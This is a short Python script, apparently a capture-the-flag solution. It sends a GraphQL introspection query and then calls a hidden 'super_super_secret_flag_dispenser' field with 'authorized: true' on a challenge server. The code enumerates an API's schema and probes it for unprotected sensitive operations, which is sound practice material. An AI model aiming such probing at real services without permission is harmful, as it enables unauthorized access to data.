import requests
import pandas as pd

query = '''query {
	echo(message: "message_here")
}'''

# show stract
query2 = '''{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
'''
# '{"query": "query{__type(name: \"Query\"){name fields{name args{name type{name kind}} type{name kind ofType{name kind}}}}}"}'


query3 = '''query {
    super_super_secret_flag_dispenser(authorized: true)
}
'''

url = 'https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php'
r = requests.post(url, json={'query': query3})
# print(r.json)
print(r.text)